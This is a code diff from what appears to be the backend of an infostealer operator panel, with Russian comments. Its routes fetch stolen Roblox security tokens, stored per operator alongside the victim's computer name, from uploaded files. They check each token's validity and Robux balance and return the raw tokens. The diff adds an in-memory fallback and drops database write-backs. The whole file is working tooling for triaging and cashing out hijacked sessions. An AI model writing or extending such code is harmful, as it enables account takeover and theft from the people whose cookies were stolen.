@@ -644,16 +644,20 @@ app.post('/robux-check', requireAuth, async (req, res) => {
 
 // POST /robux-bulk — массовая проверка всех сохранённых токенов
 app.post('/robux-bulk', requireAuth, async (req, res) => {
-  const db = await getDb();
   const user = req.authUser || req.session.user;
-  const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+  const db = await getDb();
+  let docs;
+  if (db) {
+    docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+  } else {
+    docs = (global.memFiles || []).filter(f => f.operator === user && f.roblox && f.roblox.security);
+  }
   const results = [];
   for (const doc of docs) {
     const roblox = doc.roblox || {};
     try {
       const info = await fetchRobuxInfo(roblox.security);
       results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, ...info });
-      await db.collection('files').updateOne({ _id: doc._id }, { $set: { 'robuxInfo': { checked: new Date().toISOString(), robux: info.robux, valid: info.valid } } });
     } catch (e) {
       results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message });
     }
@@ -664,24 +668,23 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
 // POST /robux-check-file — проверка токена конкретного файла
 app.post('/robux-check-file', requireAuth, async (req, res) => {
   const { filename } = req.body;
-  const db = await getDb();
   const user = req.authUser || req.session.user;
-  const doc = await db.collection('files').findOne({ name: filename, operator: user });
+  const db = await getDb();
+  let doc;
+  if (db) {
+    doc = await db.collection('files').findOne({ name: filename, operator: user });
+  } else {
+    doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+  }
   if (!doc) return res.status(404).json({ error: 'Файл не найден' });
   const roblox = doc.roblox || {};
   if (!roblox.security) return res.json({ valid: false, error: 'Токен не сохранён' });
-  const rbInfo = await fetchRobuxInfo(roblox.security);
-  if (rbInfo.valid) {
-    await db.collection('files').updateOne({ _id: doc._id }, { $set: {
-      'robuxInfo': { checked: new Date().toISOString(), robux: rbInfo.robux, valid: true },
-      ...(rbInfo.username ? { 'roblox.user': rbInfo.username } : {})
-    }});
-  } else {
-    await db.collection('files').updateOne({ _id: doc._id }, { $set: {
-      'robuxInfo': { checked: new Date().toISOString(), valid: false, error: rbInfo.error }
-    }});
+  try {
+    const rbInfo = await fetchRobuxInfo(roblox.security);
+    res.json(rbInfo);
+  } catch (e) {
+    res.json({ valid: false, error: e.message });
   }
-  res.json(rbInfo);
 });
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -691,7 +694,14 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   try {
     const db = await getDb();
-    const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+    let docs;
+    if (db) {
+      docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+    } else {
+      // In-memory fallback
+      docs = (global.memFiles || []).filter(f => f.operator === user && f.roblox && f.roblox.security);
+    }
+
     const results = [];
     for (const doc of docs) {
       const roblox = doc.roblox || {};
@@ -702,17 +712,11 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
           computer: doc.computer?.name || 'Unknown', uploadedAt: doc.uploadedAt,
           user: roblox.user, security: roblox.security, ...info
         });
-        const updateSet = { 'robuxInfo.checked': new Date().toISOString(), 'robuxInfo.robux': info.robux, 'robuxInfo.valid': info.valid };
-        if (info.valid && info.userId) {
-          updateSet['robuxInfo.userId'] = info.userId;
-          updateSet['roblox.userId'] = info.userId;
-          if (info.username) updateSet['roblox.user'] = info.username;
-        }
-        await db.collection('files').updateOne({ _id: doc._id }, { $set: updateSet });
       } catch (e) {
         results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message, security: roblox.security });
       }
     }
+
     const byUser = new Map();
     for (const r of results) {
       const id = r.userId || r.security;
